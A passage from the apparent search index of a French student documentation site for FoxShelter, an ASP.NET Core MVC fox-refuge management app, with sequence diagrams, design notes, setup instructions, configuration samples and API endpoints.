  participant R as RegimeService\n\n    E-&gt;&gt;C: GET /Renard/Create\n    C-&gt;&gt;R: ObtenirRegimesDisponibles()\n    R--&gt;&gt;C: List&lt;RegimeAlimentaire&gt;\n    C--&gt;&gt;E: Vue Create avec r\u00e9gimes\n\n    E-&gt;&gt;C: POST /Renard/Create (donn\u00e9es renard)\n    C-&gt;&gt;C: ValidateModel()\n\n    alt Validation r\u00e9ussie\n        C-&gt;&gt;S: AjouterAsync(renard)\n        S-&gt;&gt;S: ValiderDonnees(renard)\n        S-&gt;&gt;DB: Renards.Add(renard)\n        S-&gt;&gt;DB: SaveChangesAsync()\n        DB--&gt;&gt;S: Renard cr\u00e9\u00e9 avec ID\n        S--&gt;&gt;C: Renard cr\u00e9\u00e9\n        C-&gt;&gt;C: TempData[\"Succes\"] = \"Renard enregistr\u00e9\"\n        C--&gt;&gt;E: Redirect vers Details\n    else Validation \u00e9chou\u00e9e\n        C-&gt;&gt;R: ObtenirRegimesDisponibles()\n        R--&gt;&gt;C: List&lt;RegimeAlimentaire&gt;\n        C--&gt;&gt;E: Vue Create avec erreurs\n    end\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#2-diagramme-de-sequence-effectuer-un-soin-veterinaire","title":"2. Diagramme de S\u00e9quence : Effectuer un soin v\u00e9t\u00e9rinaire","text":"<pre><code>sequenceDiagram\n    participant V as V\u00e9t\u00e9rinaire\n    participant C as SoinController\n    participant S as SoinService\n    participant RS as RenardService\n    participant DB as FoxShelterContext\n    participant N as NotificationService\n\n    V-&gt;&gt;C: GET /Soin/Create?renardId=1\n    C-&gt;&gt;RS: ObtenirParIdAsync(1)\n    RS--&gt;&gt;C: Renard\n    C--&gt;&gt;V: Vue Create avec infos renard\n\n    V-&gt;&gt;C: POST /Soin/Create (donn\u00e9es soin)\n    C-&gt;&gt;C: ValidateModel()\n\n    alt Validation r\u00e9ussie\n        C-&gt;&gt;S: AjouterSoinAsync(soin)\n        S-&gt;&gt;S: ValiderSoin(soin)\n        S-&gt;&gt;DB: SoinsVeterinaires.Add(soin)\n\n        alt Soin modifie \u00e9tat de sant\u00e9\n            S-&gt;&gt;RS: ModifierEtatSanteAsync(renardId, nouvelEtat)\n            RS-&gt;&gt;DB: Renards.Update(renard)\n        end\n\n        S-&gt;&gt;DB: SaveChangesAsync()\n        DB--&gt;&gt;S: Soin enregistr\u00e9\n\n        alt Soin urgent ou critique\n            S-&gt;&gt;N: EnvoyerNotificationUrgence(soin)\n            N--&gt;&gt;S: Notification envoy\u00e9e\n        end\n\n        S--&gt;&gt;C: Soin cr\u00e9\u00e9\n        C-&gt;&gt;C: TempData[\"Succes\"] = \"Soin enregistr\u00e9\"\n        C--&gt;&gt;V: Redirect vers Details renard\n    else Validation \u00e9chou\u00e9e\n        C--&gt;&gt;V: Vue Create avec erreurs\n    end\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#3-diagramme-de-sequence-processus-dadoption","title":"3. Diagramme de S\u00e9quence : Processus d'adoption","text":"<pre><code>sequenceDiagram\n    participant A as Adoptant\n    participant C as AdoptionController\n    participant AS as AdoptionService\n    participant RS as RenardService\n    participant ES as EmailService\n    participant DB as FoxShelterContext\n\n    A-&gt;&gt;C: GET /Adoption/Disponibles\n    C-&gt;&gt;RS: ObtenirRenardsAdoptablesAsync()\n    RS-&gt;&gt;DB: Query renards adoptables\n    DB--&gt;&gt;RS: List&lt;Renard&gt;\n    RS--&gt;&gt;C: Renards adoptables\n    C--&gt;&gt;A: Vue avec renards disponibles\n\n    A-&gt;&gt;C: POST /Adoption/Demander (renardId, infos adoptant)\n    C-&gt;&gt;C: ValidateModel()\n\n    alt Validation r\u00e9ussie\n        C-&gt;&gt;AS: CreerDemandeAdoptionAsync(demande)\n        AS-&gt;&gt;AS: ValiderEligibilite(adoptant)\n        AS-&gt;&gt;DB: DemandesAdoption.Add(demande)\n        AS-&gt;&gt;DB: SaveChangesAsync()\n        DB--&gt;&gt;AS: Demande cr\u00e9\u00e9e\n\n        AS-&gt;&gt;ES: EnvoyerConfirmationDemande(adoptant)\n        ES--&gt;&gt;AS: Email envoy\u00e9\n\n        AS--&gt;&gt;C: Demande enregistr\u00e9e\n        C-&gt;&gt;C: TempData[\"Succes\"] = \"Demande enregistr\u00e9e\"\n        C--&gt;&gt;A: Vue confirmation\n    else Validation \u00e9chou\u00e9e\n        C--&gt;&gt;A: Vue avec erreurs\n    end\n\n    Note over AS: Processus d'\u00e9valuation (asynchrone)\n\n    AS-&gt;&gt;AS: EvaluerDemandeAsync(demandeId)\n\n    alt Demande approuv\u00e9e\n        AS-&gt;&gt;RS: MarquerCommeAdopteAsync(renardId)\n        RS-&gt;&gt;DB: Update renard.EstAdopte = true\n        RS-&gt;&gt;DB: SaveChangesAsync()\n\n        AS-&gt;&gt;ES: EnvoyerNotificationApprobation(adoptant)\n        ES--&gt;&gt;AS: Email envoy\u00e9\n\n        AS-&gt;&gt;AS: InitierSuiviPostAdoption(adoption)\n    else Demande refus\u00e9e\n        AS-&gt;&gt;ES: EnvoyerNotificationRefus(adoptant)\n        ES--&gt;&gt;AS: Email envoy\u00e9\n    end\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#4-diagramme-de-sequence-generation-de-statistiques","title":"4. Diagramme de S\u00e9quence : G\u00e9n\u00e9ration de statistiques","text":"<pre><code>sequenceDiagram\n    participant A as Administrateur\n    participant C as HomeController\n    participant RS as RenardService\n    participant SS as StatistiqueService\n    participant DB as FoxShelterContext\n    participant Cache as CacheService\n\n    A-&gt;&gt;C: GET /Home/Statistiques\n    C-&gt;&gt;Cache: ObtenirStatistiques(\"dashboard\")\n\n    alt Cache disponible\n        Cache--&gt;&gt;C: Statistiques en cache\n    else Cache expir\u00e9 ou absent\n        C-&gt;&gt;RS: ObtenirStatistiquesAsync()\n\n        par Statistiques renards\n            RS-&gt;&gt;DB: Query COUNT renards par \u00e9tat\n            DB--&gt;&gt;RS: Donn\u00e9es renards\n        and Statistiques soins\n            RS-&gt;&gt;DB: Query soins par p\u00e9riode\n            DB--&gt;&gt;RS: Donn\u00e9es soins\n        and Statistiques adoptions\n            RS-&gt;&gt;DB: Query adoptions par mois\n            DB--&gt;&gt;RS: Donn\u00e9es adoptions\n        end\n\n        RS-&gt;&gt;SS: CalculerStatistiquesCompletes(donn\u00e9es)\n        SS-&gt;&gt;SS: CalculerTendances()\n        SS-&gt;&gt;SS: CalculerPourcentages()\n        SS--&gt;&gt;RS: Statistiques calcul\u00e9es\n        RS--&gt;&gt;C: StatistiquesCompletes\n\n        C-&gt;&gt;Cache: SauvegarderStatistiques(\"dashboard\", stats, 1h)\n        Cache--&gt;&gt;C: Sauvegard\u00e9\n    end\n\n    C--&gt;&gt;A: Vue avec statistiques et graphiques\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#5-diagramme-de-sequence-gestion-des-alertes-systeme","title":"5. Diagramme de S\u00e9quence : Gestion des alertes syst\u00e8me","text":"<pre><code>sequenceDiagram\n    participant Sys as Syst\u00e8me (Timer)\n    participant AS as AlerteService\n    participant RS as RenardService\n    participant SS as SoinService\n    participant NS as NotificationService\n    participant DB as FoxShelterContext\n\n    Sys-&gt;&gt;AS: ExecuterVerificationsPeriodiques()\n\n    par V\u00e9rification renards critiques\n        AS-&gt;&gt;RS: ObtenirRenardsEtatCritiqueAsync()\n        RS-&gt;&gt;DB: Query renards \u00e9tat = Critique\n        DB--&gt;&gt;RS: List&lt;Renard&gt; critiques\n        RS--&gt;&gt;AS: Renards critiques\n\n        loop Pour chaque renard critique\n            AS-&gt;&gt;NS: EnvoyerAlerteUrgence(renard)\n            NS--&gt;&gt;AS: Alerte envoy\u00e9e\n        end\n\n    and V\u00e9rification suivis en retard\n        AS-&gt;&gt;SS: ObtenirSuivisEnRetardAsync()\n        SS-&gt;&gt;DB: Query soins avec suivi en retard\n        DB--&gt;&gt;SS: List&lt;SoinVeterinaire&gt;\n        SS--&gt;&gt;AS: Soins en retard\n\n        loop Pour chaque suivi en retard\n            AS-&gt;&gt;NS: EnvoyerRappelSuivi(soin)\n            NS--&gt;&gt;AS: Rappel envoy\u00e9\n        end\n\n    and V\u00e9rification capacit\u00e9 refuge\n        AS-&gt;&gt;RS: VerifierCapaciteRefugeAsync()\n        RS-&gt;&gt;DB: Query COUNT renards actifs\n        DB--&gt;&gt;RS: Nombre renards\n        RS--&gt;&gt;AS: Statut capacit\u00e9\n\n        alt Capacit\u00e9 d\u00e9pass\u00e9e\n            AS-&gt;&gt;NS: EnvoyerAlerteCapacite()\n            NS--&gt;&gt;AS: Alerte envoy\u00e9e\n        end\n    end\n\n    AS-&gt;&gt;AS: EnregistrerRapportVerification()\n    AS--&gt;&gt;Sys: V\u00e9rifications termin\u00e9es\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#6-diagramme-de-sequence-sauvegarde-et-restauration","title":"6. Diagramme de S\u00e9quence : Sauvegarde et restauration","text":"<pre><code>sequenceDiagram\n    participant A as Administrateur\n    participant C as AdminController\n    participant BS as BackupService\n    participant DB as FoxShelterContext\n    participant FS as FileSystem\n    participant Cloud as CloudStorage\n\n    A-&gt;&gt;C: POST /Admin/CreerSauvegarde\n    C-&gt;&gt;BS: CreerSauvegardeCompleteAsync()\n\n    BS-&gt;&gt;DB: BeginTransaction()\n    DB--&gt;&gt;BS: Transaction d\u00e9marr\u00e9e\n\n    par Sauvegarde donn\u00e9es\n        BS-&gt;&gt;DB: ExporterDonnees(\"renards\")\n        DB--&gt;&gt;BS: Donn\u00e9es renards\n        BS-&gt;&gt;FS: EcrireFichier(\"renards.json\")\n\n        BS-&gt;&gt;DB: ExporterDonnees(\"soins\")\n        DB--&gt;&gt;BS: Donn\u00e9es soins\n        BS-&gt;&gt;FS: EcrireFichier(\"soins.json\")\n\n        BS-&gt;&gt;DB: ExporterDonnees(\"personnel\")\n        DB--&gt;&gt;BS: Donn\u00e9es personnel\n        BS-&gt;&gt;FS: EcrireFichier(\"personnel.json\")\n    end\n\n    BS-&gt;&gt;FS: CreerArchive(\"backup_\" + timestamp + \".zip\")\n    FS--&gt;&gt;BS: Archive cr\u00e9\u00e9e\n\n    alt Sauvegarde cloud activ\u00e9e\n        BS-&gt;&gt;Cloud: TelechargerArchive(archive)\n        Cloud--&gt;&gt;BS: Upload r\u00e9ussi\n    end\n\n    BS-&gt;&gt;DB: CommitTransaction()\n    DB--&gt;&gt;BS: Transaction valid\u00e9e\n\n    BS--&gt;&gt;C: Sauvegarde termin\u00e9e\n    C-&gt;&gt;C: TempData[\"Succes\"] = \"Sauvegarde cr\u00e9\u00e9e\"\n    C--&gt;&gt;A: Redirect vers liste sauvegardes\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#patterns-et-principes-utilises","title":"Patterns et Principes Utilis\u00e9s","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#1-patterns-architecturaux","title":"1. Patterns Architecturaux","text":"<ul> <li>MVC (Model-View-Controller) : S\u00e9paration des responsabilit\u00e9s</li> <li>Service Layer : Logique m\u00e9tier centralis\u00e9e</li> <li>Repository Pattern : Abstraction de l'acc\u00e8s aux donn\u00e9es via Entity Framework</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#2-patterns-de-conception","title":"2. Patterns de Conception","text":"<ul> <li>Command Pattern : Pour les op\u00e9rations complexes</li> <li>Observer Pattern : Pour les notifications</li> <li>Strategy Pattern : Pour les diff\u00e9rents types de calculs</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#3-principes-solid","title":"3. Principes SOLID","text":"<ul> <li>Single Responsibility : Chaque service a une responsabilit\u00e9 unique</li> <li>Open/Closed : Extensions possibles sans modification</li> <li>Dependency Inversion : D\u00e9pendance vers les abstractions</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#gestion-des-erreurs","title":"Gestion des Erreurs","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#types-derreurs-gerees","title":"Types d'erreurs g\u00e9r\u00e9es","text":"<ol> <li>Erreurs de validation : Donn\u00e9es invalides</li> <li>Erreurs m\u00e9tier : R\u00e8gles business non respect\u00e9es</li> <li>Erreurs techniques : Probl\u00e8mes de base de donn\u00e9es, r\u00e9seau</li> <li>Erreurs de s\u00e9curit\u00e9 : Acc\u00e8s non autoris\u00e9</li> </ol>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#strategies-de-gestion","title":"Strat\u00e9gies de gestion","text":"<ul> <li>Try-catch dans les services</li> <li>Validation c\u00f4t\u00e9 client et serveur</li> <li>Logging des erreurs</li> <li>Messages utilisateur appropri\u00e9s</li> <li>Rollback des transactions en cas d'erreur</li> </ul>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#performance-et-optimisation","title":"Performance et Optimisation","text":""},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#strategies-utilisees","title":"Strat\u00e9gies utilis\u00e9es","text":"<ol> <li>Mise en cache des donn\u00e9es fr\u00e9quemment consult\u00e9es</li> <li>Requ\u00eates asynchrones pour les op\u00e9rations longues</li> <li>Pagination pour les listes importantes</li> <li>Lazy loading pour les relations Entity Framework</li> <li>Compression des sauvegardes</li> </ol>"},{"location":"BTS/B2/FoxShelter/Diagrammes/DiagrammeSequence/#points-dattention","title":"Points d'attention","text":"<ul> <li>N+1 queries : Utilisation d'Include() appropri\u00e9</li> <li>M\u00e9moire : Disposal des ressources</li> <li>Concurrence : Gestion des acc\u00e8s simultan\u00e9s</li> <li>Scalabilit\u00e9 : Architecture pr\u00eate pour la mont\u00e9e en charge</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/","title":"FoxShelter - Syst\u00e8me de Gestion de Refuge pour Renards","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#table-des-matieres","title":"\ud83d\udccb Table des Mati\u00e8res","text":"<ol> <li>Vue d'ensemble</li> <li>Fonctionnalit\u00e9s</li> <li>Architecture</li> <li>Pr\u00e9requis</li> <li>Installation</li> <li>Configuration</li> <li>Utilisation</li> <li>API</li> <li>Tests</li> <li>D\u00e9ploiement</li> <li>Maintenance</li> <li>Contribution</li> <li>Support</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/#vue-densemble","title":"\ud83e\udd8a Vue d'ensemble","text":"<p>FoxShelter est une application web compl\u00e8te d\u00e9velopp\u00e9e en C# .NET 8 avec ASP.NET Core MVC pour la gestion d'un refuge sp\u00e9cialis\u00e9 dans la protection et le soin des renards. Le syst\u00e8me permet de g\u00e9rer tous les aspects du refuge : renards, personnel, soins v\u00e9t\u00e9rinaires, alimentation, dons et adoptions.</p>"},{"location":"BTS/B2/FoxShelter/Documentation/#objectifs-du-projet","title":"Objectifs du Projet","text":"<ul> <li>P\u00e9dagogique : Projet complet pour BTS SIO 1 SLAM</li> <li>Pratique : Application r\u00e9elle de gestion de refuge</li> <li>Technique : D\u00e9monstration des comp\u00e9tences C# et .NET</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#technologies-utilisees","title":"Technologies Utilis\u00e9es","text":"<ul> <li>Backend : C# .NET 8, ASP.NET Core MVC</li> <li>Base de donn\u00e9es : SQL Server avec Entity Framework Core</li> <li>Frontend : HTML5, CSS3, JavaScript, Bootstrap 5</li> <li>Outils : Visual Studio, SQL Server Management Studio</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#fonctionnalites","title":"\ud83d\ude80 Fonctionnalit\u00e9s","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#gestion-des-renards","title":"Gestion des Renards","text":"<ul> <li>\u2705 Enregistrement des nouveaux arrivants</li> <li>\u2705 Suivi de l'\u00e9tat de sant\u00e9</li> <li>\u2705 Gestion des informations personnelles (nom, esp\u00e8ce, \u00e2ge, sexe)</li> <li>\u2705 Calcul automatique de la dur\u00e9e de s\u00e9jour</li> <li>\u2705 Statut d'adoption</li> <li>\u2705 Recherche et filtrage avanc\u00e9s</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#gestion-veterinaire","title":"Gestion V\u00e9t\u00e9rinaire","text":"<ul> <li>\u2705 Planification des soins</li> <li>\u2705 Historique m\u00e9dical complet</li> <li>\u2705 Gestion des m\u00e9dicaments</li> <li>\u2705 Suivi des co\u00fbts</li> <li>\u2705 Alertes pour les suivis urgents</li> <li>\u2705 Rapports m\u00e9dicaux</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#gestion-du-personnel","title":"Gestion du Personnel","text":"<ul> <li>\u2705 Employ\u00e9s et b\u00e9n\u00e9voles</li> <li>\u2705 Qualifications v\u00e9t\u00e9rinaires</li> <li>\u2705 Planning et disponibilit\u00e9s</li> <li>\u2705 Suivi des heures de b\u00e9n\u00e9volat</li> <li>\u2705 Gestion des salaires</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#gestion-alimentaire","title":"Gestion Alimentaire","text":"<ul> <li>\u2705 R\u00e9gimes alimentaires personnalis\u00e9s</li> <li>\u2705 Calcul des co\u00fbts nutritionnels</li> <li>\u2705 Planification des repas</li> <li>\u2705 Adaptation selon l'\u00e2ge</li> <li>\u2705 R\u00e9gimes m\u00e9dicaux sp\u00e9ciaux</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#gestion-des-dons","title":"Gestion des Dons","text":"<ul> <li>\u2705 Enregistrement des dons (argent, mat\u00e9riel, nourriture)</li> <li>\u2705 G\u00e9n\u00e9ration de re\u00e7us fiscaux</li> <li>\u2705 Dons r\u00e9currents</li> <li>\u2705 Suivi des donateurs</li> <li>\u2705 Rapports financiers</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#gestion-des-adoptions","title":"Gestion des Adoptions","text":"<ul> <li>\u2705 Catalogue des renards adoptables</li> <li>\u2705 Processus de demande d'adoption</li> <li>\u2705 \u00c9valuation des candidats</li> <li>\u2705 Suivi post-adoption</li> <li>\u2705 Statistiques d'adoption</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#tableaux-de-bord-et-rapports","title":"Tableaux de Bord et Rapports","text":"<ul> <li>\u2705 Statistiques en temps r\u00e9el</li> <li>\u2705 Graphiques et indicateurs</li> <li>\u2705 Alertes automatiques</li> <li>\u2705 Rapports personnalisables</li> <li>\u2705 Export des donn\u00e9es</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#architecture","title":"\ud83c\udfd7\ufe0f Architecture","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#architecture-generale","title":"Architecture G\u00e9n\u00e9rale","text":"<pre><code>FoxShelter/\n\u251c\u2500\u2500 Controllers/          # Contr\u00f4leurs MVC\n\u251c\u2500\u2500 Models/              # Mod\u00e8les de donn\u00e9es\n\u2502   \u251c\u2500\u2500 Entities/        # Entit\u00e9s m\u00e9tier\n\u2502   \u251c\u2500\u2500 Enums/          # \u00c9num\u00e9rations\n\u2502   \u2514\u2500\u2500 ViewModels/     # Mod\u00e8les de vue\n\u251c\u2500\u2500 Views/              # Vues Razor\n\u251c\u2500\u2500 Services/           # Services m\u00e9tier\n\u251c\u2500\u2500 Data/               # Contexte Entity Framework\n\u251c\u2500\u2500 wwwroot/            # Ressources statiques\n\u251c\u2500\u2500 Diagrammes/         # Documentation UML\n\u2514\u2500\u2500 Documentation/      # Documentation technique\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#couches-applicatives","title":"Couches Applicatives","text":"<ol> <li>Pr\u00e9sentation : Contr\u00f4leurs MVC et vues Razor</li> <li>Logique M\u00e9tier : Services et r\u00e8gles business</li> <li>Acc\u00e8s aux Donn\u00e9es : Entity Framework Core</li> <li>Base de Donn\u00e9es : SQL Server</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/#patterns-utilises","title":"Patterns Utilis\u00e9s","text":"<ul> <li>MVC (Model-View-Controller) : Architecture principale</li> <li>Repository Pattern : Via Entity Framework</li> <li>Service Layer : Logique m\u00e9tier centralis\u00e9e</li> <li>Dependency Injection : Inversion de contr\u00f4le</li> <li>Unit of Work : Gestion des transactions</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#prerequis","title":"\ud83d\udccb Pr\u00e9requis","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#logiciels-requis","title":"Logiciels Requis","text":"<ul> <li>Visual Studio 2022 (Community, Professional ou Enterprise)</li> <li>.NET 8 SDK ou sup\u00e9rieur</li> <li>SQL Server (LocalDB, Express ou complet)</li> <li>Git pour le contr\u00f4le de version</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#connaissances-recommandees","title":"Connaissances Recommand\u00e9es","text":"<ul> <li>C# : Syntaxe de base, POO, LINQ</li> <li>ASP.NET Core MVC : Contr\u00f4leurs, vues, mod\u00e8les</li> <li>Entity Framework Core : ORM, migrations</li> <li>SQL : Requ\u00eates de base</li> <li>HTML/CSS/JavaScript : Frontend web</li> <li>Bootstrap : Framework CSS</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#installation","title":"\ud83d\udee0\ufe0f Installation","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#1-cloner-le-projet","title":"1. Cloner le Projet","text":"<pre><code>git clone https://github.com/votre-repo/foxshelter.git\ncd foxshelter\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#2-restaurer-les-packages-nuget","title":"2. Restaurer les Packages NuGet","text":"<pre><code>dotnet restore\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#3-configurer-la-base-de-donnees","title":"3. Configurer la Base de Donn\u00e9es","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#option-a-sql-server-localdb-recommande-pour-le-developpement","title":"Option A : SQL Server LocalDB (Recommand\u00e9 pour le d\u00e9veloppement)","text":"<p>La cha\u00eene de connexion par d\u00e9faut utilise LocalDB :</p> <pre><code>{\n  \"ConnectionStrings\": {\n    \"DefaultConnection\": \"Server=(localdb)\\\\mssqllocaldb;Database=FoxShelterDB;Trusted_Connection=true;MultipleActiveResultSets=true\"\n  }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#option-b-sql-server-express","title":"Option B : SQL Server Express","text":"<p>Modifier <code>appsettings.json</code> :</p> <pre><code>{\n  \"ConnectionStrings\": {\n    \"DefaultConnection\": \"Server=.\\\\SQLEXPRESS;Database=FoxShelterDB;Trusted_Connection=true;MultipleActiveResultSets=true\"\n  }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#option-c-sql-server-avec-authentification","title":"Option C : SQL Server avec Authentification","text":"<pre><code>{\n  \"ConnectionStrings\": {\n    \"DefaultConnection\": \"Server=votre-serveur;Database=FoxShelterDB;User Id=votre-utilisateur;Password=votre-mot-de-passe;MultipleActiveResultSets=true\"\n  }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#4-creer-et-initialiser-la-base-de-donnees","title":"4. Cr\u00e9er et Initialiser la Base de Donn\u00e9es","text":"<pre><code># Cr\u00e9er la migration initiale (si pas d\u00e9j\u00e0 fait)\ndotnet ef migrations add InitialCreate\n\n# Appliquer les migrations\ndotnet ef database update\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#5-lancer-lapplication","title":"5. Lancer l'Application","text":"<pre><code>dotnet run\n</code></pre> <p>L'application sera accessible \u00e0 l'adresse : <code>https://localhost:5001</code></p>"},{"location":"BTS/B2/FoxShelter/Documentation/#configuration","title":"\u2699\ufe0f Configuration","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#fichier-appsettingsjson","title":"Fichier appsettings.json","text":"<pre><code>{\n  \"ConnectionStrings\": {\n    \"DefaultConnection\": \"Server=(localdb)\\\\mssqllocaldb;Database=FoxShelterDB;Trusted_Connection=true;MultipleActiveResultSets=true\"\n  },\n  \"Logging\": {\n    \"LogLevel\": {\n      \"Default\": \"Information\",\n      \"Microsoft.AspNetCore\": \"Warning\",\n      \"Microsoft.EntityFrameworkCore\": \"Information\"\n    }\n  },\n  \"AllowedHosts\": \"*\",\n  \"FoxShelter\": {\n    \"NomRefuge\": \"FoxShelter - Refuge pour Renards\",\n    \"Adresse\": \"123 Rue de la For\u00eat, 75001 Paris\",\n    \"Telephone\": \"01.23.45.67.89\",\n    \"Email\": \"contact@foxshelter.fr\",\n    \"SiteWeb\": \"https://www.foxshelter.fr\",\n    \"CapaciteMaximale\": 50,\n    \"HeuresOuverture\": {\n      \"Lundi\": \"09:00-18:00\",\n      \"Mardi\": \"09:00-18:00\",\n      \"Mercredi\": \"09:00-18:00\",\n      \"Jeudi\": \"09:00-18:00\",\n      \"Vendredi\": \"09:00-18:00\",\n      \"Samedi\": \"10:00-16:00\",\n      \"Dimanche\": \"Ferm\u00e9\"\n    },\n    \"Notifications\": {\n      \"EmailUrgence\": \"urgence@foxshelter.fr\",\n      \"EmailAdministration\": \"admin@foxshelter.fr\",\n      \"SeuillAlerteCritique\": 5,\n      \"DelaiRappelSuiviJours\": 3\n    }\n  }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#variables-denvironnement","title":"Variables d'Environnement","text":"<p>Pour la production, utilisez des variables d'environnement :</p> <pre><code>export ConnectionStrings__DefaultConnection=\"Server=prod-server;Database=FoxShelterDB;...\"\nexport FoxShelter__EmailUrgence=\"urgence@foxshelter.fr\"\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#utilisation","title":"\ud83d\udcd6 Utilisation","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#interface-utilisateur","title":"Interface Utilisateur","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#page-daccueil","title":"Page d'Accueil","text":"<ul> <li>Tableau de bord avec statistiques principales</li> <li>Alertes pour les cas urgents</li> <li>Liens rapides vers les fonctionnalit\u00e9s principales</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#gestion-des-renards_1","title":"Gestion des Renards","text":"<ol> <li>Ajouter un renard : Formulaire complet avec validation</li> <li>Consulter la liste : Tableau avec recherche et filtres</li> <li>Voir les d\u00e9tails : Fiche compl\u00e8te avec historique</li> <li>Modifier les informations : Mise \u00e0 jour des donn\u00e9es</li> <li>Marquer comme adopt\u00e9 : Finalisation de l'adoption</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/#gestion-des-soins","title":"Gestion des Soins","text":"<ol> <li>Programmer un soin : Planification avec v\u00e9t\u00e9rinaire</li> <li>Effectuer un soin : Saisie des d\u00e9tails et observations</li> <li>Consulter l'historique : Suivi m\u00e9dical complet</li> <li>G\u00e9n\u00e9rer des rapports : Documents m\u00e9dicaux</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/#workflows-principaux","title":"Workflows Principaux","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#arrivee-dun-nouveau-renard","title":"Arriv\u00e9e d'un Nouveau Renard","text":"<ol> <li>Cliquer sur \"Nouveau renard\"</li> <li>Remplir le formulaire d'enregistrement</li> <li>Assigner un r\u00e9gime alimentaire</li> <li>Programmer un examen v\u00e9t\u00e9rinaire</li> <li>Valider l'enregistrement</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/#processus-dadoption","title":"Processus d'Adoption","text":"<ol> <li>Consulter les renards adoptables</li> <li>\u00c9valuer la demande d'adoption</li> <li>Organiser une rencontre</li> <li>Finaliser l'adoption</li> <li>Initier le suivi post-adoption</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/#api","title":"\ud83d\udd0c API","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#endpoints-principaux","title":"Endpoints Principaux","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#renards","title":"Renards","text":"<pre><code>GET    /api/renards              # Liste tous les renards\nGET    /api/renards/{id}         # D\u00e9tails d'un renard\nPOST   /api/renards              # Cr\u00e9er un nouveau renard\nPUT    /api/renards/{id}         # Modifier un renard\nDELETE /api/renards/{id}         # Supprimer un renard\nGET    /api/renards/urgents      # Renards en \u00e9tat critique\nGET    /api/renards/adoptables   # Renards disponibles \u00e0 l'adoption\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#soins-veterinaires","title":"Soins V\u00e9t\u00e9rinaires","text":"<pre><code>GET    /api/soins                # Liste tous les soins\nPOST   /api/soins                # Enregistrer un nouveau soin\nGET    /api/soins/renard/{id}    # Historique d'un renard\nGET    /api/soins/urgents        # Soins urgents requis\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#statistiques","title":"Statistiques","text":"<pre><code>GET    /api/stats/dashboard      # Statistiques du tableau de bord\nGET    /api/stats/renards        # Statistiques d\u00e9taill\u00e9es des renards\nGET    /api/stats/financier      # Rapport financier\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#format-des-reponses","title":"Format des R\u00e9ponses","text":"<pre><code>{\n  \"success\": true,\n  \"data\": {\n    \"id\": 1,\n    \"nom\": \"Rusty\",\n    \"espece\": \"Renard roux\",\n    \"age\": 2,\n    \"sexe\": \"M\",\n    \"etatSante\": \"Bon\",\n    \"dateArrivee\": \"2024-01-15T00:00:00Z\"\n  },\n  \"message\": \"Renard r\u00e9cup\u00e9r\u00e9 avec succ\u00e8s\"\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#tests","title":"\ud83e\uddea Tests","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#tests-unitaires","title":"Tests Unitaires","text":"<pre><code># Ex\u00e9cuter tous les tests\ndotnet test\n\n# Tests avec 